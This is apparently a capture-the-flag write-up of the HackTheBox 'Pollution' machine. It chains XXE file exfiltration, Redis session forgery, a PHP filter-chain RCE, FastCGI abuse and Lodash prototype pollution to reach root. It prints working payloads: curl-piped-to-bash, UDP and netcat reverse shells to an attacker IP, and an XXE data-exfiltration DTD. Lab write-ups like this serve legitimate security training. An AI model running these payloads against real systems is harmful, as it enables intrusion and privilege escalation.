***Recon***

~~~
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.192 -oG allPorts 
~~~

~~~
$sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.192 -oG allPorts 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 17:28 IST
Initiating SYN Stealth Scan at 17:28
Scanning 10.10.11.192 [65535 ports]
Discovered open port 22/tcp on 10.10.11.192
Discovered open port 80/tcp on 10.10.11.192
Discovered open port 6379/tcp on 10.10.11.192
Completed SYN Stealth Scan at 17:28, 14.27s elapsed (65535 total ports)
Nmap scan report for 10.10.11.192
Host is up, received user-set (0.27s latency).
Scanned at 2023-05-02 17:28:22 IST for 14s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
6379/tcp open  redis   syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.38 seconds
           Raw packets sent: 68804 (3.027MB) | Rcvd: 68114 (2.725MB)

~~~

~~~
nmap -p 22,80,6379 -sCV 10.10.11.192 -oN targeted
~~~

~~~
┌─[mr_g0d@parrot]─[/media/mr_g0d/MR_G0D(500G/GOD/HTB/MACHINES/pollution]
└──╼ $nmap -p 22,80,6379 -sCV 10.10.11.192 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-02 17:51 IST
Nmap scan report for collect.htb (10.10.11.192)
Host is up (0.27s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 db1d5c65729bc64330a52ba0f01ad5fc (RSA)
|   256 4f7956c5bf20f9f14b9238edcefaac78 (ECDSA)
|_  256 df47554f4ad178a89dcdf8a02fc0fca9 (ED25519)
80/tcp   open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Home
|_http-trane-info: Problem with XML parsing of /evox/about
6379/tcp open  redis   Redis key-value store
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.26 seconds

~~~

**SUBDOMAIN ENUMERATION**

~~~
wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hc 400,404,403,200 -H "Host: FUZZ.collect.htb" -u http://collect.htb -t 100
~~~

~~~
┌─[mr_g0d@parrot]─[/media/mr_g0d/MR_G0D(500G/GOD/HTB/MACHINES/pollution]
└──╼ $wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hc 400,404,403,200 -H "Host: FUZZ.collect.htb" -u http://collect.htb -t 100 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://collect.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                              
=====================================================================

000002341:   401        14 L     54 W       469 Ch      "developers"                                                         
000000023:   200        336 L    1220 W     14098 Ch    "forum"

Total time: 21.82478
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 228.5932

~~~~

![[forum collect htb.png]]


![[developers basicauth.png]]


**We got some hints regarding Pollution API**

![[pollution api hint.png]]

While arounding with forum , we will got one file names proxy_list.txt for that we have  to register a account in the forum.collect.htb to download a file.

when i check the file ...There are some data which is encoded in base64

when i decoded i got some token and found url's /set/role/admin

~~~
POST /set/role/admin HTTP/1.1
Host: collect.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=r8qne20hig1k3li6prgk91t33j
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

token=ddac62a28254561001277727cb397baf
~~~

Now for admin panel , i used this token and replace the PHPSESSID with mine..!!!

After i refreshed ..!!!

GOT ADMIN ..!!!

![[got admin.png]]

hola...!!!Got admin panel

There i can see registration page for Pollution API

![[registration form api.png]]

Here we can see API registration form

We have to bypass this too...So I registered a account and intercepted a request.

There the data transferred like this ...!!

~~~
manage_api=<?xml version="1.0" ecoding="UTF-8"?>[<!ENTITY %xxe SYSTEM "http://10.10.14.120/mal.dtd"> %xxe;]><root><method>POST</method><uri>/auth/register<uri></uri><user><username>god</username><password>god</password><</user></root> ]
~~~

Yes there may xml injection..!!!
SO i refer this link,

https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity?ref=hacktrickz.xyz#blind-ssrf-exfiltrate-data-out-of-band

XXE Injection for File read

Although regular payloads do not work, we can attempt an XXE Injection. To overcome this issue, we can generate a DTD file and prompt the website to process it by sending a GET request. Following some experimentation, I discovered that by utilizing the php://filter/ approach and encoding the information using base64, I was able to access some of the files.xxe

I used this payload 

~~~
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
~~~

Modified for me :

~~~
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://10.10.14.120/?file=%file;'>">
%eval;
%exfiltrate;
~~~

Payload used:

~~~
manage_api=<?xml version="1.0" ecoding="UTF-8"?>[<!ENTITY %xxe SYSTEM "http://10.10.14.120/mal.dtd"> %xxe;]><root><method>POST</method><uri>/auth/register<uri></uri><user><username>god</username><password>god</password><</user></root> ]
~~~


![[mal.dtd.png]]

From here, I wanted to read the **/var/www/developers/.htpasswd** file since we found a password on it earlier.

Using john , we could crack the hash to give r0cket as the password. We were confronted with another login page.

![[another login.png]]

another login , we got credentials by cracking hash 

~~~
developers_group : r0cket
~~~

We have to look for credentials in another location this time. The password is probably concealed in that Redis instance, and we can't access the **/etc/redis** file without root privileges, so there must be another file elsewhere. I attempted to locate any **config.php** files, but my search proved fruitless. Since the present directory was empty, I understood that we had to navigate one level up. After researching Redis, I stumbled upon the **bootstrap.php** file, which turned out to be the solution. This file was located at **bootstrap.php**.

![[redis auth.png]]

We can login via **redis-cli** wth credentials.

~~~
AUTH COLLECTR3D1SPASS
~~~
Now we can list all KEYs by 

~~~
KEYS *
~~~


![[get redis.png]]


We can see so many PHPREDIS_SESSION Keys, There just we have to set our account id to admin , when we used that token in our page after refreshing we will become  admin .

~~~
set PHPREDIS_SESSION:e50hu9lk5rkblb7tdlm3310fk4 "username|s:10:"testing123";role|s:5:"admin";auth|s:1:"a";"
~~~

here S:5 it is word count that means letter count..!!!

Then, replace the cookie and login to the developers.collect.htb endpoint.


![[got developers home page.png]]

From here we can easily get remote code execution , see there is a ID parameter

The "page" parameter on this website appears to be dubious, and we can attempt to fuzz for Remote Code Execution (RCE) or Local File Inclusion (LFI) vulnerabilities. Despite the page being devoid of useful content, the page parameter changes each time we visit a different website, which raised some suspicion. However, I was unsuccessful in obtaining any LFI that would enable me to read other files. I surmised that there must be some sort of backend check on this parameter. I subsequently came across a PHP Filter bypass technique on Hacktricks that demonstrated that RCE was feasible through that parameter. The provided tool, php_filter_chain_generator, worked flawlessly. However, there was a length constraint that was causing the request to crash, so we opted to use PHP Shorthand Code, which employs the   tags as a shorthand for PHP code. Since we now have RCE, we can store the shell on my web server instead.

Ref link : https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it.html?ref=hacktrickz.xyz

https://github.com/synacktiv/php_filter_chain_generator?ref=hacktrickz.xyz

Create a bash script for shell and name shell.sh

~~~
/bin/sh -i >& /dev/udp/10.10.14.120/1234 0>&1
~~~

Give it execute permission (chmod +x) and host the file via a web server (python -m http.server 80)

The next step is to curl the file and pipe it over to bash, so it gets executed: 

~~~
python3 php_filter_chain_generator.py --chain '
~~~

Payload :

~~~
/?c=curl+10.10.14.99/shell.sh|bash&page=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
~~~

We have a working shell and can operate www-data. Upgrade the shell to a fully interactive one and let's get user from here.

**www-data to victor - mysql, fastcgi**

Got www data
![[got shell ww data.png]]

We enumerate a bunch of config files and get the credentials for the MySQL service on port 3306.

![[sql credentials 1.png]]

Got credentials..!!

~~~
webapp_user : Str0ngP4ssw0rdB*12@1
~~~

Enumerate MySql:

~~~
mysql -u webapp_user -p
~~~

Go ahead and dump the tables, maybe we can extract something valuable.

There are couple of databases: 
• developers
• forum 
• webapp 
• pollution_api

![[admin code sql.png]]

There is a service listening on locahost port 9000 and after some time spend on Google, we realize it is the fastcgi service. 
See here: https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi 

1. We can read the user.txt flag by tweaking the script a bit.
2. We can pop another reverse shell, by issuing:

payload :

~~~
#!/bin/bash

PAYLOAD="<?php echo '<!--'; system('whoami'); echo '-->';"
FILENAMES="/var/www/public/index.php" # Exisiting file path

HOST=$1
B64=$(echo "$PAYLOAD"|base64)

for FN in $FILENAMES; do
    OUTPUT=$(mktemp)
    env -i \
      PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \
      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
      cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT

    cat $OUTPUT
done
~~~

modified payload:

~~~
#!/bin/bash

PAYLOAD="<?php echo '<!--'; system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.99 1234 >/tmp/f'); echo '-->';"
FILENAMES="/dev/shm/index.php" # Exisiting file path

HOST=$1
B64=$(echo "$PAYLOAD"|base64)

for FN in $FILENAMES; do
    OUTPUT=$(mktemp)
    env -i \
      PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \
      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
      cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT

    cat $OUTPUT
done

~~~

~~~
nc -lvnp 1234
~~~

Yes got ..!! Victor 

we can get the user flag now..!!


**Root Escalation**

Within Victor's directory, there's a pollution_api folder. The index.js file specifies that there is this service running on port 3000.

![[index.js.png]]
Since this box was called pollution, I assumed that there was some Javascript pollution related exploit that would give us root. Within the controllers directory, there was this Message_send.js script.

~~~
const Message = require('../models/Message');
const { decodejwt } = require('../functions/jwt');
const _ = require('lodash'); 
const { exec } = require('child_process');

const messages_send = async(req,res)=>{
			const token = decodejwt(req.headers['x-access-token']) if(req.body.text){ 
			const message = { 
			user_sent: token.user, 
			title: "Message for admins", }; 
			
			_.merge(message, req.body); exec('/home/victor/pollution_api/log.sh log_message'); Message.create({ 
			text: JSON.stringify(message), 
			user_sent: token.user }); 
			return res.json({Status: "Ok"});
			 }
			 return res.json({Status: "Error", Message: "Parameter text not found"}); } 
			 module.exports = { messages_send };
~~~

So there was this _.merge function being used. This function was vulnerable to a Lodash Merge Pollution attack, which allows for RCE as root. Prototype pollution basically allows us to control the default values of the object's properties, and we can tamper with the application logic. Since there is an exec function right after this that executes a pre-determined command, we can use this exploit to 'alter' the values passed into this. This would allow us to change what is being executed. In this case, the root user is likely running this API, hence exploitation would allow for RCE as root. Hacktricks has some examples of attacks that can be done using this.
{% embed url="https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototypepollution/prototype-pollution-to-rce#exec-exploitation" %}

Prototype Pollution First,

we would need to get a valid token to interact with the API. Earlier, we did register a user, and we just need to promote this user to an administrator. We can do this with the MySQL instance we accessed earlier.

![[admin set for token sql.png]]

~~~
curl -X POST http://localhost:3000/auth/login -H 'Content-Type: application/json' -d '{"username":"test", "password":"test"}'
~~~

we got our token admin,

~~~
{"Status":"Ok","Header":{"x-access-token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsImlzX2F1dGgiOnRydWUsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY4MzE0MjIzOCwiZXhwIjoxNjgzMTQ1ODM4fQ.G_jvoi-l6Li8mixzljkGkPmo3HgOK3vgg-8AEbQJ-mM"}}
~~~

~~~
curl -X POST http://127.0.0.1:3000/admin/messages/send -H "X-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsImlzX2F1dGgiOnRydWUsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY4MzE0NDg0NywiZXhwIjoxNjgzMTQ4NDQ3fQ.D2I2t8qslNgRuxWfpuqSQyXOghT5Kfkc4_k7_6L5JIA" -H "content-type: application/json" -d '{"text":{"constructor":{"prototype":{"shell":"/proc/self/exe","argv0":"console.log(require(\"child_process\").execSync(\"chmod +s /usr/bin/bash\").toString())//","NODE_OPTIONS":"--require /proc/self/cmdline"}}}}'

~~~


![[root.png]]

Finally got root..!!

